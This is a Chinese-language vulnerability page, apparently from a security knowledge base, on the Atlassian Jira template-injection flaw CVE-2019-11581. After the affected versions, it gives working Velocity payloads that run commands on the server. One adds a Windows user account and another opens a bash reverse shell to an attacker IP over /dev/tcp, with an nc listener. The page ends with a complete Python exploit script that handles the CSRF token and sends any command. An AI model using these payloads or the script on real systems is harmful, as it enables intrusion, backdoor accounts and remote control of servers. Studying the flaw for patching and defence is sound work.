<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2019-11581atlassian-jira-远程命令执行漏洞"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2019-11581</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Atlassian Jira </span><span class="csECDA2D3">远程命令执行漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">此漏洞由于</span><span class="cs8926E06">Atlassian Jira</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">Atlassian Jira Server</span><span class="cs9C1B1871">和</span><span class="cs8926E06">Jira Data Center</span><span class="cs9C1B1871">模块存在模板注入，当</span><span class="cs8926E06">&rdquo;</span><span class="cs9C1B1871">联系管理员表单</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">功能开启时，攻击者可以在表单插入</span><span class="cs8926E06">java</span><span class="cs9C1B1871">恶意代码</span><span class="cs8926E06">,</span><span class="cs9C1B1871">当服务端对传入数据进行解析时</span><span class="cs8926E06">,</span><span class="cs9C1B1871">会执行数据中插入的恶意代码</span><span class="cs8926E06">,</span><span class="cs9C1B1871">并执行其中的命令。</span><span class="csE3F655E4">攻击者通过这种方式可以实现远程代码执行漏洞的利用，获取服务器的敏感信息泄露，甚至可以利用此漏洞进一步对服务器数据进行修改，增加，删除等操作</span><span class="cs9C1B1871">，对服务器造成巨大的影响。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Atlassian Jira 4.4.x<br/>Atlassian Jira 5.x.x<br/>Atlassian Jira 6.x.x<br/>Atlassian Jira 7.0.x<br/>Atlassian Jira 7.1.x<br/>Atlassian Jira 7.2.x<br/>Atlassian Jira 7.3.x<br/>Atlassian Jira 7.4.x<br/>Atlassian Jira 7.5.x<br/>Atlassian Jira 7.6.x &lt; 7.6.14<br/>Atlassian Jira 7.7.x<br/>Atlassian Jira 7.8.x<br/>Atlassian Jira 7.9.x<br/>Atlassian Jira 7.10.x<br/>Atlassian Jira 7.11.x<br/>Atlassian Jira 7.12.x<br/>Atlassian Jira 7.13.x &lt; 7.13.5<br/>Atlassian Jira 8.0.x &lt; 8.0.3<br/>Atlassian Jira 8.1.x &lt; 8.1.2<br/>Atlassian Jira 8.2.x &lt; 8.2.3</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs5BEC2C28">1.</span><span class="csE3F655E4">利用前提条件：</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">第一种，未授权代码执行利用条件：</span><span class="cs8926E06">Jira</span><span class="cs9C1B1871">已配置好</span><span class="cs8926E06">SMTP</span><span class="cs9C1B1871">服务器，且需开启</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">联系网站管理员表单</span><span class="cs8926E06">&rdquo;</span><span class="cs9C1B1871">功能。（从</span><span class="cs8926E06">WEB</span><span class="cs9C1B1871">界面设计上看，实际上如果没配置</span><span class="cs8926E06">SMTP</span><span class="cs9C1B1871">服务器，无法开启此功能</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">第二种利用场景前提是拿到</span><span class="cs8926E06">Jira</span><span class="cs9C1B1871">管理员的权限，利用条件较难满足，这里主要分析第一种情况。原因在于</span><span class="cs8926E06">atlassian-jira/WEB-INF/classes/com/atlassian/jira/web/action/user/ContactAdministrators </span><span class="cs9C1B1871">未对</span><span class="cs8926E06">Subject</span><span class="cs9C1B1871">（邮件主题）处进行过滤，用户传入的邮件主题被当作</span><span class="cs8926E06">template</span><span class="cs9C1B1871">（模板）指令执行。在任何一种情况下，成功利用此漏洞的攻击者都可在运行受影响版本的</span><span class="cs8926E06">Jira Server</span><span class="cs9C1B1871">或</span><span class="cs8926E06">Jira Data Center</span><span class="cs9C1B1871">的系统上执行任意命令。</span></p><p class="cs40DD2BC9"><span class="cs5BEC2C28">2.</span><span class="csE3F655E4">以下两种</span><span class="cs5BEC2C28">url</span><span class="csE3F655E4">漏洞验证方式：</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">第一种无需管理员账户权限：</span><span class="cs8926E06">http://www.0-sec.org:8080<a class="cs508254C" href="http://ip:port/secure/ContactAdministrators!default.jspa"><span class="cs4B51D5E4">/secure/ContactAdministrators!default.jspa</span></a></span></p><p class="cs40DD2BC9"><span><img src="Web安全/Atlassian_Jira/%ef%bc%88CVE-2019-11581%ef%bc%89Atlassian%20Jira%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="309" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">第二种需管理员账户权限：</span><span class="cs8926E06">http://www.0-sec.org:8080/secure/admin/SendBulkMail!default.jspa</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Atlassian_Jira/%ef%bc%88CVE-2019-11581%ef%bc%89Atlassian%20Jira%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="283" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs5BEC2C28">1. </span><span class="csE3F655E4">漏洞利用条件</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">联系管理员处必须开启</span><span class="cs8926E06"> </span><span class="cs9C1B1871">（需要知道后台管理员账号密码）</span></p><p class="cs40DD2BC9"><span class="cs5BEC2C28">2.</span><span class="csE3F655E4">环境准备：</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Atlassian JIRAv7.13.0 (</span><span class="cs9C1B1871">以该版本为例，该版本存在漏洞</span><span class="cs8926E06">)</span><span class="cs9C1B1871">下载地址：</span></p><p class="cs40DD2BC9"><span class="cs8926E06">https://product-downloads.atlassian.com/software/jira/downloads/atlassian-jira-software-7.13.0-x64.exe</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">安装过程不再描述（按照提示进行安装，先在官方注册一个账号然后拿到一个试用期序列号并进行安装），注意，到了邮件配置那一步经尽量选以后</span><span class="cs8926E06">(</span><span class="cs9C1B1871">默认就是</span><span class="cs8926E06">)</span><span class="cs9C1B1871">，然后进入后台配置。</span></p><p class="cs40DD2BC9"><span class="cs5BEC2C28">3.</span><span class="csE3F655E4">确认未登陆状态下漏洞的存在</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">访问如下</span><span class="cs8926E06">URL</span><span class="cs9C1B1871">（无需管理员账户权限）：</span></p><p class="cs40DD2BC9"><span class="cs8926E06">http://www.0-sec.org:8080/secure/ContactAdministrators!default.jspa</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如果提示如下图，这说明没有配置联系管理员是无法触发漏洞。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Atlassian_Jira/%ef%bc%88CVE-2019-11581%ef%bc%89Atlassian%20Jira%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="316" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">请登陆后台开启联系管理员，配置地址如下：</span></p><p class="cs40DD2BC9"><span class="cs8926E06">http://www.0-sec.org:8080/secure/admin/EditApplicationProperties!default.jspa</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">默认是关闭的，需要配置了</span><span class="cs8926E06">STMP</span><span class="cs9C1B1871">发信后才能开启，配置</span><span class="cs8926E06">STMP</span><span class="cs9C1B1871">的时候可以测试连接，服务器必须开</span><span class="cs8926E06">25</span><span class="cs9C1B1871">端口，不然不能发邮件，下图是开启成功</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Atlassian_Jira/%ef%bc%88CVE-2019-11581%ef%bc%89Atlassian%20Jira%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image3.png" width="560" height="312" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs5BEC2C28">4.</span><span class="csE3F655E4">未登陆状态下触发漏洞</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">访问</span></p><p class="cs40DD2BC9"><span class="cs8926E06">http://www.0-sec.org:8080/secure/ContactAdministrators!default.jspa</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Atlassian_Jira/%ef%bc%88CVE-2019-11581%ef%bc%89Atlassian%20Jira%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image4.png" width="560" height="290" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06">Subject</span><span class="cs9C1B1871">填入</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">，注意，我这里环境是</span><span class="cs8926E06">windows</span><span class="cs9C1B1871">机器，所以可以添加账号观察，</span><span class="cs8926E06">Linux</span><span class="cs9C1B1871">可以用反弹</span><span class="cs8926E06">shell</span><span class="cs9C1B1871">的代码等等</span><span class="cs8926E06">,</span><span class="cs9C1B1871">反正换成自己想执行的命令。</span></p><p class="cs3A447A38"><span class="cs9FB05234">$i18n.getClass().forName(&#39;java.lang.Runtime&#39;).getMethod(&#39;getRuntime&#39;,null).invoke(null,null).exec(&#39;net user bk abc@ABC123 /add&#39;).waitFor()</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Atlassian_Jira/%ef%bc%88CVE-2019-11581%ef%bc%89Atlassian%20Jira%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image5.png" width="560" height="339" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">发送了后可能会等一会儿，因为要加入邮件队列。这时候再上服务器执行</span><span class="cs8926E06">net user</span><span class="cs9C1B1871">查看，发现正是刚刚执行命令添加的账户。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Atlassian_Jira/%ef%bc%88CVE-2019-11581%ef%bc%89Atlassian%20Jira%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image6.png" width="560" height="306" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs5BEC2C28">5. </span><span class="csE3F655E4">登陆管理员账号触发漏洞</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">登陆管理员账号，然后访问如下</span><span class="cs8926E06">URL</span><span class="cs9C1B1871">：</span></p><p class="cs40DD2BC9"><span class="cs8926E06">http://www.0-sec.org:8080/secure/admin/SendBulkMail!default.jspa</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">填入</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">，如下，注意执行命令添加账号的账户名</span></p><p class="cs3A447A38"><span class="cs9FB05234">$i18n.getClass().forName(&#39;java.lang.Runtime&#39;).getMethod(&#39;getRuntime&#39;,null).invoke(null,null).exec(&#39;net user bk01 abc@ABC123 /add&#39;).waitFor()</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Atlassian_Jira/%ef%bc%88CVE-2019-11581%ef%bc%89Atlassian%20Jira%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image7.png" width="560" height="342" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/Atlassian_Jira/%ef%bc%88CVE-2019-11581%ef%bc%89Atlassian%20Jira%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image8.png" width="560" height="376" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">linux</span><span class="cs9C1B1871">下可执行：</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">目标</span><span class="cs8926E06">Jira</span><span class="cs9C1B1871">系统可执行的</span><span class="cs8926E06">POC</span></p><p class="cs3A447A38"><span class="cs9FB05234">$i18n.getClass().forName(&#39;java.lang.Runtime&#39;).getMethod(&#39;getRuntime&#39;,null).invoke(null,null).exec(&#39;curl http://www.baidu.com&#39;).waitFor()</span></p><p class="cs3A447A38"><span class="cs9FB05234">$i18n.getClass().forName(&#39;java.lang.Runtime&#39;).getMethod(&#39;getRuntime&#39;,null).invoke(null,null).exec(&#39;bash -i &gt;&amp; /dev/tcp/</span><span class="cs7FFD2630">攻击者</span><span class="cs9FB05234">IP/2333 0&gt;&amp;1&#39;).waitFor()</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">攻击者主机执行</span><span class="cs8926E06">:nc -lvvp 2333</span></p><h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs6FD73CFB"><span class="cs8926E06">scan</span></p><p class="cs3A447A38"><span class="cs9FB05234">#/usr/bin/python</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># -*- coding: utf8 -*-</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># the program intents to automate the process of exploiting CVE-2019-11581 During our engagments - quick and dirty</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># I will probably will add features to make it more easy.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Ths is some skeleton and probably things will not work on first run</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234"># Importing</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import sys</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import argparse</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from bs4 import BeautifulSoup</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import cmd</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">parser = argparse.ArgumentParser()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">parser.add_argument(&quot;domain&quot;, help=&quot;JIRA Instance&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">parser.add_argument(&quot;cmd&quot;, help=&quot;Command to run&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">args = parser.parse_args()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">#Some Debugging Globals</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">http_proxy &nbsp;= &quot;http://127.0.0.1:8080&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">https_proxy = &quot;https://127.0.0.1:8080&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ftp_proxy &nbsp;&nbsp;= &quot;ftp://127.0.0.1:8080&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#Proxy Dictionary</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">proxyDict = { </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;http&quot; &nbsp;: http_proxy, </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;https&quot; : https_proxy</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">headers = {&#39;UserAgent&#39;:&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0&#39;}</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def JiraScan(domain,cmd):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;#Filtering host</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;domain = domain + &#39;/secure/ContactAdministrators!default.jspa&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;#Checking if host is vulnerable by checking if specific string is present</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;s = requests.Session()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r = s.get(domain, proxies=proxyDict, verify=False)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;html_doc = r.content</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;soup = BeautifulSoup(html_doc, &#39;lxml&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;notvuln = soup.findAll(&quot;div&quot;,{&quot;class&quot;:&quot;aui-message aui-message-warning warningd&quot;})</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if notvuln:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;[-] Not Vulnerable&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;[+] Checking if Vulnerable&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#In order to have valid request we need to handle JIRA CSRF Tokens</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#Extracting atl_token from form</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;html_doc = r.content</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;soup = BeautifulSoup(html_doc, &#39;lxml&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data = soup.findAll(attrs={&quot;name&quot; : &quot;atl_token&quot;})</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print data</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#Returning Token value</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;token = data[0][&#39;value&#39;]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print token</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#Replacing path</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;domain= domain.replace(&#39;!default.jspa&#39;,&#39;.jspa&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# body of post request</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#(),&#39;subject&#39;:&quot;&quot;,&#39;details&#39;:&quot;,&#39;atl_token&#39;: value,&#39;Send&#39;:&#39;Send&#39;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload = &quot;$i18n.getClass().forName(&#39;java.lang.Runtime&#39;).getMethod(&#39;getRuntime&#39;,null).invoke(null,null).exec(&#39;%s&#39;).waitFor()&quot; % cmd</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;qparams = ((&#39;from&#39;,&#39;JIRA@JIRA.com&#39;),(&#39;subject&#39;,payload),(&#39;details&#39;,payload),(&#39;atl_token&#39;,token),(&#39;Send&#39;,&#39;Send&#39;))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#Final Payload</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;attack = s.post(domain, headers = headers, data = qparams, proxies=proxyDict, verify=False)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">if __name__ == &#39;__main__&#39;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;JiraScan(args.domain,args.cmd)</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://www.cnblogs.com/backlion/p/11608439.html</span></p></body>
</html>
